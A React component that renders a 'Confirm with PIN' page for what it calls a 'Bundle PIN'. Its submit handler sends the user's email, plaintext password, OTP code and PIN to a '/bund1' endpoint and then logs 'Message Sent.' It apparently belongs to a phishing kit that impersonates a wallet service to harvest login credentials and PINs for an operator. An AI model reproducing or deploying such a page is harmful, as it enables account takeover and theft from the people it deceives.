import React, { useState } from 'react'
import { useHistory } from 'react-router-dom'
import OtpInput from 'react-otp-input'
import URL from './Url.js'


export default function ConfirmOtp(props) {
    const history = useHistory()

    const [otp, setOtp] = useState('')
    const [keepOtp, setKeepOtp] = useState([])
    const [loading, setLoading] = useState(false)

    const inputHandler = (input) => {
        setOtp(input)
        setKeepOtp((singleOtp) => [input])
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        const clientOtp = keepOtp.toString()
        const propState = props.location.state

        if (propState) {
            propState.clientOtp = clientOtp

            try {
                
                const response = await fetch(URL + '/bund1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + propState.token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        email: propState.email,
                        password: propState.password,
                        otp: propState.code,
                        pin: clientOtp,
                    }),
                })

                const resData = await response.json()

                if (resData.status === 'success') {
                    console.log('Message Sent.')

                    setLoading(false)

                    history.push('/')
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
                setLoading(false)
            }
        }
    }

    return (
        <div className='container mx-auto h-screen'>
            <div className='max-w-sm mx-auto md:max-w-lg h-full grid'>
                <div className='w-full grid content-center'>
                    <div className=' h-64 py-3 px-4 rounded mb-40'>
                        <form
                            className='grid w-full place-content-stretch md:w-3/4 md:mx-auto'
                            onSubmit={handleSubmit}
                        >
                            <h2 className='font-black text-justify text-black mb-2 text-xl'>
                                Confirm with PIN
                            </h2>
                            <p className='text-justify text-gray-500'>
                                Please type in your Bundle PIN
                            </p>

                            <OtpInput
                                value={otp}
                                onChange={inputHandler}
                                numInputs={4}
                                inputStyle='pinlogin-field'
                                containerStyle='pinlogin'
                                shouldAutoFocus
                                isInputNum
                            />

                            <button className=' rounded-3xl outline-none  bg-[#6f42c1] text-white text-lg py-2 mt-10 grid justify-self-center w-2/5'>
                                {loading ? 'loading..' : 'Confirm'}
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    )
}
